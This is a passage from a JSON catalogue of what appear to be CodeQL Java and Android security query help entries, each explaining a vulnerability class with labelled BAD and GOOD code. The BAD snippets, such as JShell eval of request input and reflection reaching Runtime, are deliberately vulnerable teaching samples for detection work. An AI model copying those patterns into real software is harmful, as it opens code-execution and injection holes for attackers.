executor,\n        new BiometricPrompt.AuthenticationCallback() {\n            @Override\n            // GOOD: This authentication callback uses the result to decrypt some data.\n            public void onAuthenticationSucceeded(BiometricPrompt.AuthenticationResult result) {\n                Cipher cipher = result.getCryptoObject().getCipher();\n                byte[] decryptedData = cipher.doFinal(encryptedData);\n                grantAccessWithData(decryptedData);\n            }\n        }\n    );\n}\n```\n\n## References\n* OWASP Mobile Application Security: [Android Local Authentication](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)\n* OWASP Mobile Application Security: [Testing Biometric Authentication](https://mas.owasp.org/MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0018/)\n* WithSecure: [How Secure is your Android Keystore Authentication?](https://labs.withsecure.com/publications/how-secure-is-your-android-keystore-authentication)\n* Android Developers: [Biometric Authentication](https://developer.android.com/training/sign-in/biometric-auth)\n* Common Weakness Enumeration: [CWE-287](https://cwe.mitre.org/data/definitions/287.html).\n"
  },
  "java/jshell-injection": {
    "name": "JShell injection",
    "description": "Evaluation of a user-controlled JShell expression may lead to arbitrary code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/jshell-injection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-094"
    ],
    "filename": "dad3fd69-JShellInjection",
    "language": "java",
    "help": "# JShell injection\nThe Java Shell tool (JShell) is an interactive tool for learning the Java programming language and prototyping Java code. JShell is a Read-Evaluate-Print Loop (REPL), which evaluates declarations, statements, and expressions as they are entered and immediately shows the results. If an expression is built using attacker-controlled data and then evaluated, it may allow the attacker to run arbitrary code.\n\n\n## Recommendation\nIt is generally recommended to avoid using untrusted input in a JShell expression. If it is not possible, JShell expressions should be run in a sandbox that allows accessing only explicitly allowed classes.\n\n\n## Example\nThe following example calls `JShell.eval(...)` or `SourceCodeAnalysis.wrappers(...)` to execute untrusted data.\n\n\n```java\nimport javax.servlet.http.HttpServletRequest;\nimport jdk.jshell.JShell;\nimport jdk.jshell.SourceCodeAnalysis;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\n\n@Controller\npublic class JShellInjection {\n\n\t@GetMapping(value = \"bad1\")\n\tpublic void bad1(HttpServletRequest request) {\n\t\tString input = request.getParameter(\"code\");\n\t\tJShell jShell = JShell.builder().build();\n        // BAD: allow execution of arbitrary Java code\n\t\tjShell.eval(input);\n\t}\n\n\t@GetMapping(value = \"bad2\")\n\tpublic void bad2(HttpServletRequest request) {\n\t\tString input = request.getParameter(\"code\");\n\t\tJShell jShell = JShell.builder().build();\n\t\tSourceCodeAnalysis sourceCodeAnalysis = jShell.sourceCodeAnalysis();\n        // BAD: allow execution of arbitrary Java code\n\t\tsourceCodeAnalysis.wrappers(input);\n\t}\n\n\t@GetMapping(value = \"bad3\")\n\tpublic void bad3(HttpServletRequest request) {\n\t\tString input = request.getParameter(\"code\");\n\t\tJShell jShell = JShell.builder().build();\n\t\tSourceCodeAnalysis.CompletionInfo info;\n\t\tSourceCodeAnalysis sca = jShell.sourceCodeAnalysis();\n\t\tfor (info = sca.analyzeCompletion(input);\n\t\t\t\tinfo.completeness().isComplete();\n\t\t\t\tinfo = sca.analyzeCompletion(info.remaining())) {\n\t\t\t// BAD: allow execution of arbitrary Java code\n\t\t\tjShell.eval(info.source());\n\t\t}\n\t}\n}\n```\n\n## References\n* Java Shell User\u2019s Guide: [Introduction to JShell](https://docs.oracle.com/en/java/javase/11/jshell/introduction-jshell.html)\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "java/android/nfe-local-android-dos": {
    "name": "Local Android DoS Caused By NumberFormatException",
    "description": "NumberFormatException thrown but not caught by an Android application that allows external inputs can crash the application, constituting a local Denial of Service (DoS) attack.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "precision": "medium",
    "id": "java/android/nfe-local-android-dos",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-755"
    ],
    "filename": "e4527106-NFEAndroidDoS",
    "language": "java",
    "help": "# Local Android DoS Caused By NumberFormatException\nNumberFormatException (NFE) thrown but not caught by an Android application will crash the application. If the application allows external inputs, an attacker can send an invalid number as intent extra to trigger NFE, which introduces local Denial of Service (Dos) attack.\n\nThis is a common problem in Android development since Android components don't have `throw Exception(...)` in their class and method definitions.\n\n\n## Recommendation\nUse the Android methods intended to get number extras e.g. `Intent.getFloatExtra(String name, float defaultValue)` since they have the built-in try/catch processing, or explicitly do try/catch in the application.\n\n\n## Example\nThe following example shows both 'BAD' and 'GOOD' configurations. In the 'BAD' configuration, number value is retrieved as string extra then parsed to double. In the 'GOOD' configuration, number value is retrieved as integer extra.\n\n\n```java\npublic class NFEAndroidDoS extends Activity {\n\tpublic void onCreate(Bundle savedInstanceState) {\n\t\tsuper.onCreate(savedInstanceState);\n\t\tsetContentView(R.layout.activity_view);\n\n\t\t// BAD: Uncaught NumberFormatException due to remote user inputs\n\t\t{\n\t\t\tString minPriceStr = getIntent().getStringExtra(\"priceMin\");\n\t\t\tdouble minPrice = Double.parseDouble(minPriceStr);\t\n\t\t}\n\n\t\t// GOOD: Use the proper Android method to get number extra  \n\t\t{\n\t\t\tint width = getIntent().getIntExtra(\"width\", 0);\n\t\t\tint height = getIntent().getIntExtra(\"height\", 0);\n\t\t}\n\t}\n}\n```\n\n## References\n* CWE: [CWE-755: Improper Handling of Exceptional Conditions](https://cwe.mitre.org/data/definitions/749.html)\n* Android Developers: [Android Crashes](https://developer.android.com/topic/performance/vitals/crash)\n* Google Analytics: [Crash and Exception Measurement Using the Google Analytics SDK](https://developers.google.com/analytics/devguides/collection/android/v4/exceptions)\n* Common Weakness Enumeration: [CWE-755](https://cwe.mitre.org/data/definitions/755.html).\n"
  },
  "java/http-response-splitting": {
    "name": "HTTP response splitting",
    "description": "Writing user input directly to an HTTP header makes code vulnerable to attack by header splitting.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "high",
    "id": "java/http-response-splitting",
    "tags": [
      "security",
      "external/cwe/cwe-113"
    ],
    "filename": "9b5a8d70-ResponseSplitting",
    "language": "java",
    "help": "# HTTP response splitting\nDirectly writing user input (for example, an HTTP request parameter) to an HTTP header can lead to an HTTP request-splitting or response-splitting vulnerability.\n\nHTTP response splitting can lead to vulnerabilities such as XSS and cache poisoning.\n\nHTTP request splitting can allow an attacker to inject an additional HTTP request into a client's outgoing socket connection. This can allow an attacker to perform an SSRF-like attack.\n\nIn the context of a servlet container, if the user input includes blank lines and the servlet container does not escape the blank lines, then a remote user can cause the response to turn into two separate responses. The remote user can then control one or more responses, which is also HTTP response splitting.\n\n\n## Recommendation\nGuard against HTTP header splitting in the same way as guarding against cross-site scripting. Before passing any data into HTTP headers, either check the data for special characters, or escape any special characters that are present.\n\nIf the code calls Netty API's directly, ensure that the `validateHeaders` parameter is set to `true`.\n\n\n## Example\nThe following example shows the 'name' parameter being written to a cookie in two different ways. The first way writes it directly to the cookie, and thus is vulnerable to response-splitting attacks. The second way first removes all special characters, thus avoiding the potential problem.\n\n\n```java\npublic class ResponseSplitting extends HttpServlet {\n\tprotected void doGet(HttpServletRequest request, HttpServletResponse response)\n\tthrows ServletException, IOException {\n\t\t// BAD: setting a cookie with an unvalidated parameter\n\t\tCookie cookie = new Cookie(\"name\", request.getParameter(\"name\"));\n\t\tresponse.addCookie(cookie);\n\n\t\t// GOOD: remove special characters before putting them in the header\n\t\tString name = removeSpecial(request.getParameter(\"name\"));\n\t\tCookie cookie2 = new Cookie(\"name\", name);\n\t\tresponse.addCookie(cookie2);\n\t}\n\n\tprivate static String removeSpecial(String str) {\n\t\treturn str.replaceAll(\"[^a-zA-Z ]\", \"\");\n\t}\n}\n\n```\n\n## Example\nThe following example shows the use of the library 'netty' with HTTP response-splitting verification configurations. The second way will verify the parameters before using them to build the HTTP response.\n\n\n```java\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\n\npublic class ResponseSplitting {\n    // BAD: Disables the internal response splitting verification\n    private final DefaultHttpHeaders badHeaders = new DefaultHttpHeaders(false);\n\n    // GOOD: Verifies headers passed don't contain CRLF characters\n    private final DefaultHttpHeaders goodHeaders = new DefaultHttpHeaders();\n\n    // BAD: Disables the internal response splitting verification\n    private final DefaultHttpResponse badResponse = new DefaultHttpResponse(version, httpResponseStatus, false);\n\n    // GOOD: Verifies headers passed don't contain CRLF characters\n    private final DefaultHttpResponse goodResponse = new DefaultHttpResponse(version, httpResponseStatus);\n}\n\n```\n\n## Example\nThe following example shows the use of the netty library with configurations for verification of HTTP request splitting. The second recommended approach in the example verifies the parameters before using them to build the HTTP request.\n\n\n```java\npublic class NettyRequestSplitting {\n    // BAD: Disables the internal request splitting verification\n    private final DefaultHttpHeaders badHeaders = new DefaultHttpHeaders(false);\n\n    // GOOD: Verifies headers passed don't contain CRLF characters\n    private final DefaultHttpHeaders goodHeaders = new DefaultHttpHeaders();\n\n    // BAD: Disables the internal request splitting verification\n    private final DefaultHttpRequest badRequest = new DefaultHttpRequest(httpVersion, method, uri, false);\n\n    // GOOD: Verifies headers passed don't contain CRLF characters\n    private final DefaultHttpRequest goodResponse = new DefaultHttpRequest(httpVersion, method, uri);\n}\n\n```\n\n## References\n* SecLists.org: [HTTP response splitting](https://seclists.org/bugtraq/2005/Apr/187).\n* OWASP: [HTTP Response Splitting](https://www.owasp.org/index.php/HTTP_Response_Splitting).\n* Wikipedia: [HTTP response splitting](http://en.wikipedia.org/wiki/HTTP_response_splitting).\n* CAPEC: [CAPEC-105: HTTP Request Splitting](https://capec.mitre.org/data/definitions/105.html)\n* Common Weakness Enumeration: [CWE-113](https://cwe.mitre.org/data/definitions/113.html).\n"
  },
  "java/android/debuggable-attribute-enabled": {
    "name": "Android debuggable attribute enabled",
    "description": "An enabled debugger can allow for entry points in the application or reveal sensitive information.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.2,
    "id": "java/android/debuggable-attribute-enabled",
    "tags": [
      "security",
      "external/cwe/cwe-489"
    ],
    "precision": "very-high",
    "filename": "78003e54-DebuggableAttributeEnabled",
    "language": "java",
    "help": "# Android debuggable attribute enabled\nThe Android manifest file defines configuration settings for Android applications. In this file, the `android:debuggable` attribute of the `application` element can be used to define whether or not the application can be debugged. When set to `true`, this attribute will allow the application to be debugged even when running on a device in user mode.\n\nWhen a debugger is enabled, it could allow for entry points in the application or reveal sensitive information. As a result, `android:debuggable` should only be enabled during development and should be disabled in production builds.\n\n\n## Recommendation\nIn Android applications, either set the `android:debuggable` attribute to `false`, or do not include it in the manifest. The default value, when not included, is `false`.\n\n\n## Example\nIn the example below, the `android:debuggable` attribute is set to `true`.\n\n\n```xml\n<manifest ... >\n    <!-- BAD: 'android:debuggable' set to 'true' -->\n    <application\n        android:debuggable=\"true\">\n        <activity ... >\n        </activity>\n    </application>\n</manifest>\n\n```\nThe corrected version sets the `android:debuggable` attribute to `false`.\n\n\n```xml\n<manifest ... >\n    <!-- GOOD: 'android:debuggable' set to 'false' -->\n    <application\n        android:debuggable=\"false\">\n        <activity ... >\n        </activity>\n    </application>\n</manifest>\n\n```\n\n## References\n* Android Developers: [App Manifest Overview](https://developer.android.com/guide/topics/manifest/manifest-intro).\n* Android Developers: [The android:debuggable attribute](https://developer.android.com/guide/topics/manifest/application-element#debug).\n* Android Developers: [Enable debugging](https://developer.android.com/studio/debug#enable-debug).\n* Common Weakness Enumeration: [CWE-489](https://cwe.mitre.org/data/definitions/489.html).\n"
  },
  "java/improper-validation-of-array-index": {
    "name": "Improper validation of user-provided array index",
    "description": "Using external input as an index to an array, without proper validation, can lead to index out of bound exceptions.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 8.8,
    "precision": "medium",
    "id": "java/improper-validation-of-array-index",
    "tags": [
      "security",
      "external/cwe/cwe-129"
    ],
    "filename": "e2275c9e-ImproperValidationOfArrayIndex",
    "language": "java",
    "help": "# Improper validation of user-provided array index\nUsing unvalidated input as part of an index into the array can cause the array access to throw an `ArrayIndexOutOfBoundsException`. This is because there is no guarantee that the index provided is within the bounds of the array.\n\nThis problem occurs when user input is used as an array index, either directly or following one or more calculations. If the user input is unsanitized, it may be any value, which could result in either a negative index, or an index which is larger than the size of the array, either of which would result in an `ArrayIndexOutOfBoundsException`.\n\n\n## Recommendation\nThe index used in the array access should be checked against the bounds of the array before being used. The index should be smaller than the array size, and it should not be negative.\n\n\n## Example\nThe following program accesses an element from a fixed size constant array:\n\n\n```java\npublic class ImproperValidationOfArrayIndex extends HttpServlet {\n\n  protected void doGet(HttpServletRequest request, HttpServletResponse response)\n  throws ServletException, IOException {\n    String[] productDescriptions = new String[] { \"Chocolate bar\", \"Fizzy drink\" };\n\n    // User provided value\n    String productID = request.getParameter(\"productID\");\n    try {\n        int productID = Integer.parseInt(userProperty.trim());\n\n        /*\n         * BAD Array is accessed without checking if the user provided value is out of\n         * bounds.\n         */\n        String productDescription = productDescriptions[productID];\n\n        if (productID >= 0 && productID < productDescriptions.length) {\n          // GOOD We have checked that the array index is valid first\n          productDescription = productDescriptions[productID];\n        } else {\n          productDescription = \"No product for that ID\";\n        }\n\n        response.getWriter().write(productDescription);\n\n    } catch (NumberFormatException e) { }\n  }\n}\n```\nThe first access of the `productDescriptions` array uses the user-provided value as the index without performing any checks. If the user provides a negative value, or a value larger than the size of the array, then an `ArrayIndexOutOfBoundsException` may be thrown.\n\nThe second access of the `productDescriptions` array is contained within a conditional expression that verifies the user-provided value is a valid index into the array. This ensures that the access operation never throws an `ArrayIndexOutOfBoundsException`.\n\n\n## References\n* Java API Specification: [ArrayIndexOutOfBoundsException](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/ArrayIndexOutOfBoundsException.html).\n* Common Weakness Enumeration: [CWE-129](https://cwe.mitre.org/data/definitions/129.html).\n"
  },
  "java/spring-view-manipulation": {
    "name": "Spring View Manipulation",
    "description": "Untrusted input in a Spring View can lead to RCE.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/spring-view-manipulation",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-094"
    ],
    "filename": "dad3fd69-SpringViewManipulation",
    "language": "java",
    "help": "# Spring View Manipulation\nThe Spring Expression Language (SpEL) is a powerful expression language provided by Spring Framework. The language offers many features including invocation of methods available in the JVM.\n\nAn unrestricted view name manipulation vulnerability in Spring Framework could lead to attacker-controlled arbitrary SpEL expressions being evaluated using attacker-controlled data, which may in turn allow an attacker to run arbitrary code.\n\nNote: two related variants of this problem are detected by different queries, \\`java/spring-view-manipulation\\` and \\`java/spring-view-manipulation-implicit\\`. The first detects taint flow problems where the return types is always `String`. While the latter, \\`java/spring-view-manipulation-implicit\\` detects cases where the request mapping method has a non-string return type such as `void`.\n\n\n## Recommendation\nIn general, using user input to determine Spring view name should be avoided. If user input must be included in the expression, the controller can be annotated by a `@ResponseBody` annotation. In this case, Spring Framework does not interpret it as a view name, but just returns this string in HTTP Response. The same applies to using a `@RestController` annotation on a class, as internally it inherits `@ResponseBody`.\n\n\n## Example\nIn the following example, the `Fragment` method uses an externally controlled variable `section` to generate the view name. Hence, it is vulnerable to Spring View Manipulation attacks.\n\n\n```java\n@Controller\npublic class SptingViewManipulationController {\n\n    Logger log = LoggerFactory.getLogger(HelloController.class);\n\n    @GetMapping(\"/safe/fragment\")\n    public String Fragment(@RequestParam String section) {\n        // bad as template path is attacker controlled\n        return \"welcome :: \" + section;\n    }\n\n    @GetMapping(\"/doc/{document}\")\n    public void getDocument(@PathVariable String document) {\n        // returns void, so view name is taken from URI\n        log.info(\"Retrieving \" + document);\n    }\n}\n\n```\nThis can be easily prevented by using the `ResponseBody` annotation which marks the response is already processed preventing exploitation of Spring View Manipulation vulnerabilities. Alternatively, this can also be fixed by adding a `HttpServletResponse` parameter to the method definition as shown in the example below.\n\n\n```java\n@Controller\npublic class SptingViewManipulationController {\n\n    Logger log = LoggerFactory.getLogger(HelloController.class);\n\n    @GetMapping(\"/safe/fragment\")\n    @ResponseBody\n    public String Fragment(@RequestParam String section) {\n        // good, as `@ResponseBody` annotation tells Spring\n        // to process the return values as body, instead of view name\n        return \"welcome :: \" + section;\n    }\n\n    @GetMapping(\"/safe/doc/{document}\")\n    public void getDocument(@PathVariable String document, HttpServletResponse response) {\n        // good as `HttpServletResponse param tells Spring that the response is already\n        // processed.\n        log.info(\"Retrieving \" + document); // FP\n    }\n}\n\n```\n\n## References\n* Veracode Research : [Spring View Manipulation ](https://github.com/veracode-research/spring-view-manipulation/)\n* Spring Framework Reference Documentation: [Spring Expression Language (SpEL)](https://docs.spring.io/spring/docs/4.2.x/spring-framework-reference/html/expressions.html)\n* OWASP: [Expression Language Injection](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "java/android/missing-certificate-pinning": {
    "name": "Android missing certificate pinning",
    "description": "Network connections that do not use certificate pinning may allow attackers to eavesdrop on communications.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 5.9,
    "precision": "medium",
    "id": "java/android/missing-certificate-pinning",
    "tags": [
      "security",
      "external/cwe/cwe-295"
    ],
    "filename": "865b12b5-AndroidMissingCertificatePinning",
    "language": "java",
    "help": "# Android missing certificate pinning\nCertificate pinning is the practice of only trusting a specific set of SSL certificates, rather than those that the device trusts by default. In Android applications, it is reccomended to use certificate pinning when communicating over the network, in order to minimize the risk of machine-in-the-middle attacks from a compromised CA.\n\n\n## Recommendation\nThe easiest way to implement certificate pinning is to declare your pins in a `network-security-config` XML file. This will automatically provide certificate pinning for any network connection made by the app.\n\nAnother way to implement certificate pinning is to use the \\`CertificatePinner\\` class from the \\`okhttp\\` library.\n\nA final way to implement certificate pinning is to use a `TrustManager`, initialized from a `KeyStore` loaded with only the necessary certificates.\n\n\n## Example\nIn the first (bad) case below, a network call is performed with no certificate pinning implemented. The other (good) cases demonstrate the different ways to implement certificate pinning.\n\n\n```java\n// BAD - By default, this network call does not use certificate pinning\nURLConnection conn = new URL(\"https://example.com\").openConnection();\n```\n\n```xml\n<!-- GOOD: Certificate pinning implemented via a Network Security Config file -->\n\n<!-- In AndroidManifest.xml -->\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    package=\"com.example.app\">\n\n    <application android:networkSecurityConfig=\"@xml/NetworkSecurityConfig\">\n        ...\n    </application>\n\n</manifest>\n\n<!-- In res/xml/NetworkSecurityConfig.xml -->\n<network-security-config>\n    <domain-config>\n        <domain>good.example.com</domain>\n        <pin-set expiration=\"2038/1/19\">\n            <pin digest=\"SHA-256\">...</pin>\n        </pin-set>\n    </domain-config>\n</network-security-config>\n```\n\n```java\n// GOOD: Certificate pinning implemented via okhttp3.CertificatePinner \nCertificatePinner certificatePinner = new CertificatePinner.Builder()\n    .add(\"example.com\", \"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\")\n    .build();\nOkHttpClient client = new OkHttpClient.Builder()\n    .certificatePinner(certificatePinner)\n    .build();\n\nclient.newCall(new Request.Builder().url(\"https://example.com\").build()).execute();\n\n\n\n// GOOD: Certificate pinning implemented via a TrustManager\nKeyStore keyStore = KeyStore.getInstance(\"BKS\");\nkeyStore.load(resources.openRawResource(R.raw.cert), null);\n\nTrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\ntmf.init(keyStore);\n\nSSLContext sslContext = SSLContext.getInstance(\"TLS\");\nsslContext.init(null, tmf.getTrustManagers(), null);\n\nURL url = new URL(\"http://www.example.com/\");\nHttpsURLConnection urlConnection = (HttpsURLConnection) url.openConnection(); \n\nurlConnection.setSSLSocketFactory(sslContext.getSocketFactory());\n```\n\n## References\n* OWASP Mobile Security: [Testing Custom Certificate Stores and Certificate Pinning (MSTG-NETWORK-4)](https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05g-testing-network-communication#testing-custom-certificate-stores-and-certificate-pinning-mstg-network-4).\n* Android Developers: [Network security configuration](https://developer.android.com/training/articles/security-config).\n* OkHttp: [CertificatePinner](https://square.github.io/okhttp/4.x/okhttp/okhttp3/-certificate-pinner/).\n* Common Weakness Enumeration: [CWE-295](https://cwe.mitre.org/data/definitions/295.html).\n"
  },
  "java/unsafe-reflection": {
    "name": "Use of externally-controlled input to select classes or code ('unsafe reflection')",
    "description": "Use external input with reflection function to select the class or code to be used, which brings serious security risks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/unsafe-reflection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-470"
    ],
    "filename": "ab597e1d-UnsafeReflection",
    "language": "java",
    "help": "# Use of externally-controlled input to select classes or code ('unsafe reflection')\nAllowing users to freely choose the name of a class to instantiate could provide means to attack a vulnerable application.\n\n\n## Recommendation\nCreate a list of classes that are allowed to load reflectively and strictly verify the input to ensure that users can only instantiate classes or execute methods that ought to be allowed.\n\n\n## Example\nThe `bad` method shown below illustrate class loading with `Class.forName` without any check on the particular class being instantiated. The `good` methods illustrate some different ways to restrict which classes can be instantiated.\n\n\n```java\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Map;\nimport javax.servlet.http.HttpServletRequest;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.util.StringUtils;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.RequestBody;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestMethod;\nimport org.springframework.web.multipart.MultipartFile;\n\n@Controller\npublic class UnsafeReflection {\n\n    @RequestMapping(value = {\"/service/{beanIdOrClassName}/{methodName}\"}, method = {RequestMethod.POST}, consumes = {\"application/json\"}, produces = {\"application/json\"})\n    public Object bad1(@PathVariable(\"beanIdOrClassName\") String beanIdOrClassName, @PathVariable(\"methodName\") String methodName, @RequestBody Map<String, Object> body) throws Exception {\n        List<Object> rawData = null;\n        try {\n            rawData = (List<Object>)body.get(\"methodInput\");\n        } catch (Exception e) {\n            return e;\n        }\n        return invokeService(beanIdOrClassName, methodName, null, rawData);\n    }\n\n    @GetMapping(value = \"uf1\")\n    public void good1(HttpServletRequest request) throws Exception {\n        HashSet<String> hashSet = new HashSet<>();\n        hashSet.add(\"com.example.test1\");\n        hashSet.add(\"com.example.test2\");\n        String className = request.getParameter(\"className\");\n        String parameterValue = request.getParameter(\"parameterValue\");\n        if (!hashSet.contains(className)){ \n            throw new Exception(\"Class not valid: \"  + className);\n        }\n        try {\n            Class clazz = Class.forName(className);\n            Object object = clazz.getDeclaredConstructors()[0].newInstance(parameterValue); //good\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    @GetMapping(value = \"uf2\")\n    public void good2(HttpServletRequest request) throws Exception {\n        String className = request.getParameter(\"className\");\n        String parameterValue = request.getParameter(\"parameterValue\");\n        if (!\"com.example.test1\".equals(className)){\n            throw new Exception(\"Class not valid: \"  + className);\n        }\n        try {\n            Class clazz = Class.forName(className);\n            Object object = clazz.getDeclaredConstructors()[0].newInstance(parameterValue); //good\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private Object invokeService(String beanIdOrClassName, String methodName, MultipartFile[] files, List<Object> data) throws Exception {\n        BeanFactory beanFactory = new BeanFactory();\n\t\ttry {\n\t\t\tObject bean = null;\n\t\t\tClass<?> beanClass = Class.forName(beanIdOrClassName);\n\t\t\tbean = beanFactory.getBean(beanClass);\n\t\t\tbyte b;\n\t\t\tint i;\n\t\t\tMethod[] arrayOfMethod;\n\t\t\tfor (i = (arrayOfMethod = bean.getClass().getMethods()).length, b = 0; b < i; ) {\n\t\t\t\tMethod method = arrayOfMethod[b];\n\t\t\t\tif (!method.getName().equals(methodName)) {\n\t\t\t\t\tb++;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tObject result = method.invoke(bean, data);\n\t\t\t\tMap<String, Object> map = new HashMap<>();\n\t\t\t\treturn map;\n\t\t\t}\n\t\t} catch (Exception e) {\n\t\t\treturn e;\n\t\t}\n\t\treturn null;\n    }\n}\n\nclass BeanFactory {\n\n\tprivate static HashMap<String, Object> classNameMap = new HashMap<>();\n\n\tprivate static HashMap<Class<?>, Object> classMap = new HashMap<>();\n\n\tstatic {\n\t\tclassNameMap.put(\"xxxx\", Runtime.getRuntime());\n\t\tclassMap.put(Runtime.class, Runtime.getRuntime());\n\t}\n\n\tpublic Object getBean(Class<?> clzz) {\n\t\treturn classMap.get(clzz);\n\t}\n}\n\n```\n\n## References\n* Unsafe use of Reflection | OWASP: [Unsafe use of Reflection](https://owasp.org/www-community/vulnerabilities/Unsafe_use_of_Reflection).\n* Java owasp: Classes should not be loaded dynamically: [Classes should not be loaded dynamically](https://rules.sonarsource.com/java/tag/owasp/RSPEC-2658).\n* Common Weakness Enumeration: [CWE-470](https://cwe.mitre.org/data/definitions/470.html).\n"
  },
  "java/incorrect-url-verification": {
    "name": "Incorrect URL verification",
    "description": "Apps that rely on URL parsing to verify that a given URL is pointing to a trusted server are susceptible to wrong ways of URL parsing and verification.",
    "kind": "problem",
    "problem.severity": "warning",
    "precision": "medium",
    "id": "java/incorrect-url-verification",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-939"
    ],
    "filename": "ef037d9c-IncorrectURLVerification",
    "language": "java",
    "help": "# Incorrect URL verification\nApps that rely on URL Parsing to verify that a given URL is pointing to a trust server may be susceptible to many different ways to get URL parsing and verification wrong, which allows an attacker to register a fake site to break the access control.\n\n\n## Recommendation\nVerify the whole host and domain (FQDN) or check endsWith dot+domain.\n\n\n## Example\nThe following example shows two ways of verifying host domain. In the 'BAD' case, verification is implemented as partial domain match. In the 'GOOD' case, full domain is verified.\n\n\n```java\npublic boolean shouldOverrideUrlLoading(WebView view, String url) {\n    {\n        Uri uri = Uri.parse(url);\n        // BAD: partial domain match, which allows an attacker to register a domain like myexample.com to circumvent the verification\n        if (uri.getHost() != null && uri.getHost().endsWith(\"example.com\")) {\n            return false;\n        }\n    }\n\n    {\n        Uri uri = Uri.parse(url);\n        // GOOD: full domain match\n        if (uri.getHost() != null && uri.getHost().endsWith(\".example.com\")) {\n            return false;\n        }\n    }\n}\n\n```\n\n## References\n* [Common Android app vulnerabilities from Sebastian Porst of Google](https://drive.google.com/file/d/0BwMN49Gzo3x6T1N5WGQ4TTNlMHBOb1ZRQTVEWnVBZjFUaE5N/view)\n* [Common Android app vulnerabilities from bugcrowd](https://www.bugcrowd.com/resources/webinars/overview-of-common-android-app-vulnerabilities/)\n* Common Weakness Enumeration: [CWE-939](https://cwe.mitre.org/data/definitions/939.html).\n"
  },
  "java/android/websettings-javascript-enabled": {
    "name": "Android WebView JavaScript settings",
    "description": "Enabling JavaScript execution in a WebView can result in cross-site scripting attacks.",
    "kind": "problem",
    "id": "java/android/websettings-javascript-enabled",
    "problem.severity": "warning",
    "security-severity": 6.1,
    "precision": "medium",
    "tags": [
      "security",
      "external/cwe/cwe-079"
    ],
    "filename": "918405f7-AndroidWebViewSettingsEnabledJavaScript",
    "language": "java",
    "help": "# Android WebView JavaScript settings\nEnabling JavaScript in an Android WebView allows the execution of JavaScript code in the context of the running application. This creates a cross-site scripting vulnerability.\n\nFor example, if your application's WebView allows for visiting web pages that you do not trust, it is possible for an attacker to lead the user to a page which loads malicious JavaScript.\n\nYou can enable or disable Javascript execution using the `setJavaScriptEnabled` method of the settings of a WebView.\n\n\n## Recommendation\nJavaScript execution is disabled by default. You can explicitly disable it by calling `setJavaScriptEnabled(false)` on the settings of the WebView.\n\nIf JavaScript is necessary, only load content from trusted servers using encrypted channels, such as HTTPS with certificate verification.\n\n\n## Example\nIn the following (bad) example, a WebView has JavaScript enabled in its settings:\n\n\n```java\nWebSettings settings = webview.getSettings();\nsettings.setJavaScriptEnabled(true);\n\n```\nIn the following (good) example, a WebView explicitly disallows JavaScript execution:\n\n\n```java\nWebSettings settings = webview.getSettings();\nsettings.setJavaScriptEnabled(false);\n\n```\n\n## References\n* Android documentation: [setJavaScriptEnabled](https://developer.android.com/reference/android/webkit/WebSettings#setJavaScriptEnabled(boolean))\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n"
  },
  "java/struts-development-mode": {
    "name": "Apache Struts development mode enabled",
    "description": "Enabling struts development mode in production environment can lead to remote code execution.",
    "kind": "problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/struts-development-mode",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-489"
    ],
    "filename": "41baf539-devMode",
    "language": "java",
